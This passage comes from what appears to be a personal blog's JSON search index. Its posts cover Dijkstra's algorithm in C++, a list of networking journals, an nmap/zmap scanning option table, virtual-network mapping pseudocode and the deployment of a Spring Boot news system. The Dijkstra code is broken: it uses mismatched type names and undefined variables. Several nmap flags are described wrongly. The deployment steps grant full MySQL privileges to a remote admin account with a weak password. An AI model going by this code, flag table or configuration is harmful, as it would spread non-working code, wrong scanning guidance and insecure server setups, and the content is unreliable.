番剧信息API（目前b站似乎后台API都换了，下次搞的时候更新","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"url","slug":"url","permalink":"http://waynamigo.github.io/tags/url/"}]},{"title":"Dijstra","slug":"2018-12-11-dijstra","date":"2018-12-10T16:00:00.000Z","updated":"2019-07-14T10:10:41.295Z","comments":true,"path":"2018/12/11/2018-12-11-dijstra/","link":"","permalink":"http://waynamigo.github.io/2018/12/11/2018-12-11-dijstra/","excerpt":"求最短路的算法只记得Floyd，单源最短路Dijstra差点忘了已经忘了","text":"求最短路的算法只记得Floyd，单源最短路Dijstra差点忘了已经忘了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546struct Link&#123; int from,to,dist;&#125;;struct Node&#123; int d,u; bool operator &lt;(const HeapNode &amp; a) const&#123; return d &gt; a.d; &#125;&#125;;struct SubstrateNetwork&#123; int nodes; int links vector&lt;Link&gt; maplinks; bool isvisited[nodes+1]; vector&lt;int&gt; G[nodes+1]; int distance[nodes+1]; int p[nodes+1]; void init(int n)&#123; this-&gt;n = n; for(int i = 0;i &lt;= n;i++) G[i].clear(); memset(vis,false,sizeof vis); for(int i = 0;i &lt;= n;i++) p[i] = i; for(int i = 1;i &lt;= n;i++) d[i] = INF; &#125; void dijstra(int s)&#123; priority_queue&lt;Node&gt; q; q.push(Node&#123;0,s&#125;); distance[s] = 0; while(!q.empty())&#123; Node temp = q.top(); q.pop(); int u = temp.u; if(isvisited[u]) continue; isvisited[u]=true; for(int i=0;i&lt;G[u].size();i++)&#123; Link e = maplinks[G[u][i]]; if(distance[e.to] &gt; distance[u] + e.dist)&#123; distance[e.to] = distance[u] + e.dist; p[e.to] = u; q.push(HeapNode&#123;distance[e.to],e.to&#125;); &#125; &#125; &#125; &#125;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://waynamigo.github.io/categories/算法/"}],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"http://waynamigo.github.io/tags/algorithm/"}]},{"title":"一些网页链接","slug":"2018-12-08-网页链接","date":"2018-12-07T16:00:00.000Z","updated":"2019-07-14T10:10:07.598Z","comments":true,"path":"2018/12/08/2018-12-08-网页链接/","link":"","permalink":"http://waynamigo.github.io/2018/12/08/2018-12-08-网页链接/","excerpt":"","text":"网络原理相关期刊 顶级期刊名称：ieee network主页网址：ieee network 名称：journal of network and computer applications主页网址：journal of network and computer applications 名称：ieee-acm transactions on networking主页网址：ieee-acm transactions on networking 名称：Ad Hoc Networks主页网址：Ad Hoc Networks 名称：cluster computing-the journal of networks software tools and applications主页网址：cluster computing-the journal of networks software tools and applications 名称：Computer Networks主页网址：Computer Networks 名称：Optical Switching and Networking主页网址：Optical Switching and Networking 名称：Mobile Networks and Applications主页网址：Mobile Networks and Applications 名称：Wireless Networks主页网址：Wireless Networks 名称：Networks主页网址：Networks 名称：Journal of Network and Systems Management主页网址：Journal of Network and Systems Management 顶级会议：名称：acm sigcomm主页网址：acm sigcomm 名称: ieee infocom主页网址：ieee infocom","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"},{"name":"url","slug":"url","permalink":"http://waynamigo.github.io/tags/url/"}]},{"title":"椭圆加密等","slug":"2018-12-01-模拟退火","date":"2018-12-01T16:00:00.000Z","updated":"2019-07-14T10:09:44.910Z","comments":true,"path":"2018/12/02/2018-12-01-模拟退火/","link":"","permalink":"http://waynamigo.github.io/2018/12/02/2018-12-01-模拟退火/","excerpt":"先鸽了","text":"先鸽了 椭圆加密算法解析椭圆加密原理公式E(a,b) : y^2 = x^3 + a*x +b mod p 每个点 通过带入x的变量，选取一个质数p来进行模运算。","categories":[{"name":"算法","slug":"算法","permalink":"http://waynamigo.github.io/categories/算法/"}],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"http://waynamigo.github.io/tags/algorithm/"}]},{"title":"nmap zmap使用","slug":"2018-12-01-nmap&zmap","date":"2018-11-30T16:00:00.000Z","updated":"2019-07-14T12:16:27.641Z","comments":true,"path":"2018/12/01/2018-12-01-nmap&zmap/","link":"","permalink":"http://waynamigo.github.io/2018/12/01/2018-12-01-nmap&zmap/","excerpt":"nmap 和 zmap的参数表，端口嗅探","text":"nmap 和 zmap的参数表，端口嗅探 参数表 参数 功能 -sL TCP SYN -sT Connect -sA ACK -sW Window -sM Maimon scans -sU UDP scan -sN TCP NULL -sF FIN -sX Xmax scans -sI host:probeport] zombie host scan -sY SCTP INIT -sZ Cookie-echo scans -sO IP protocol scan -b FTPserver FTP bounce scan 主机扫描 参照的详解文章[https://www.cnblogs.com/nmap/p/6232969.html] 参数 功能 -sL TCP SYN -sn Ping Scan - disable port scan（测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态） -sS 发送SYN包到远程主机，但不会产生任何会话，目标主机不会把连接记入系统日志。（为了防止对方判断为扫描攻击，目前挺多加防服务器直接会把扫自己端口的的ip拉黑） -sA Connect，探测主机是否开机 -PE Connect -PS80 ACK -PR Window -Pn 无ping扫描 -sP 快速ping，扫描本地局域网有那些机器，或者直接可以用前缀式表示类似于x.x.x.0/24","categories":[{"name":"渗透","slug":"渗透","permalink":"http://waynamigo.github.io/categories/渗透/"}],"tags":[{"name":"sniffer","slug":"sniffer","permalink":"http://waynamigo.github.io/tags/sniffer/"}]},{"title":"映射过程描述","slug":"2018-12-01-映射过程描述","date":"2018-11-30T16:00:00.000Z","updated":"2019-07-14T10:07:17.311Z","comments":true,"path":"2018/12/01/2018-12-01-映射过程描述/","link":"","permalink":"http://waynamigo.github.io/2018/12/01/2018-12-01-映射过程描述/","excerpt":"虚拟网络映射算法的节点、链路映射一般过程","text":"虚拟网络映射算法的节点、链路映射一般过程 映射过程123456789for(request:requestList)&#123; 映射成功标记 flag ① flag = 节点映射结果 if(falg) 节点资源分配 执行②部分 else 本组request映射失败 ② flag = 链路映射结果 if(falg) 链路资源分配 else 本组request映射失败&#125; 节点映射过程12345678910111213排序物理网络、网络请求的节点;//每一次按改进的H值（加入负载均衡系数后）对物理网络进行排序for( vn_node : vn_nodes)&#123;//对每一个排序后的虚拟节点 for(遍历物理节点)&#123; if(物理节点节点剩余CPU &gt; 虚拟节点CPU需求)&#123; 存储映射结果，跳出for循环，映射下一个节点 &#125; if(物理节点遍历结束)&#123; 映射失败,返回false &#125; &#125;&#125;节点映射成功，分配物理节点资源 链路映射过程123456789101112for(vn_link :vn_links)&#123;//对每一个request的链路请求 取出链路需求带宽，起、止节点id 根据起止节点id(from,to)查找最短路径 floyd if(finded)&#123; //找到链路后验证带宽 if(链路需求带宽 &gt; 物理链路剩余带宽) 映射失败; else 将这一条链路加入resultLinks（链路映射最终结果） &#125;else&#123; return false;//链路不通，映射失败 &#125; &#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://waynamigo.github.io/categories/算法/"}],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"http://waynamigo.github.io/tags/algorithm/"}]},{"title":"springboot+modleView+rmi调用自己写的天气预报的新闻系统","slug":"2018-11-30-newsSystem","date":"2018-11-29T16:00:00.000Z","updated":"2019-07-14T12:16:07.051Z","comments":true,"path":"2018/11/30/2018-11-30-newsSystem/","link":"","permalink":"http://waynamigo.github.io/2018/11/30/2018-11-30-newsSystem/","excerpt":"一个springboot(collect springmvc、hibernate、modleView）+rmi远程调用天气预报系统的小项目","text":"一个springboot(collect springmvc、hibernate、modleView）+rmi远程调用天气预报系统的小项目 newsSystem 先放上作业的代码地址 新闻系统 newsSystem 下面是在centos服务器上部署环境，建一个新数据库用户进行管理创建数据库123456yum install mysql mysql-server mysql-develcreate user newsadmin;create database newsbase;grant all privileges on newsbase.* to newsadmin@localhost identified by'password';revoke all on *.* from 'admin'@'%';grant all on *.* to 'admin'@'%' identified by 'wdnm' 数据库用户名，密码在application.yml文件中配置 服务器环境123456yum install java-1.8.0-openjdk-devel安装maven到usr/local/apache-mavenexport MAVEN_HOME=/usr/local/apache-mavenexport PATH=$&#123;MAVEN_HOME&#125;/bin:$PATH服务器端Could not find or load main class org.apache.maven.wrapper.MavenWrapperMain错误解决：mvn io.takari:maven:wrapper 环境变量别写错mysql服务没启动的错误，很奇妙 123/etc/rc.d/init.d/mysqld status /etc/init.d/mysqld start 创建项目文件夹12mkdir /classdesignchmod 754 /classdesign 运行项目123nohup java -jar newsSystem.jar &gt; springbootinfo.out 2&gt;&amp;1 &amp;或nohup ./mvnw spring-boot:run &gt; springbootinfo.out 2&gt;&amp;1 &amp; 代码高亮测试，还行1234567891011121314151617181920212223242526272829303132333435 @Controller public class PageController &#123; @Autowired UserService userService=new UserService(); @Autowired NewsService newsService=new NewsService(); boolean isadmin = false; private static Logger logger = Logger.getLogger(PageController.class); @RequestMapping(\"/login/\") public String login(@RequestParam(value = \"username\", defaultValue = \"null\") String name, @RequestParam(value = \"password\", defaultValue = \"null\") String password, Model model)&#123;//String username, String password,Model model try &#123; User user = userService.findUser(name,password); if (user!=null)&#123; model.addAttribute(\"user\",user); if(user.getId()==1)&#123; logger.info(\"admin status\"); isadmin=true; &#125; logger.info(\"login success:username=\"+name); return \"redirect:/newspage/\"; &#125;else&#123; model.addAttribute(\"msg\",\"nosuchuser\"); logger.info(\"login failed:no such user\"); // return \"success\"; &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return null; &#125;&#125; 数据库内容 Tables_in_newsbase hibernate_sequence news user ——————–","categories":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/tags/java/"},{"name":"springboot","slug":"springboot","permalink":"http://waynamigo.github.io/tags/springboot/"},{"name":"rmi","slug":"rmi","permalink":"http://waynamigo.github.io/tags/rmi/"}]}]}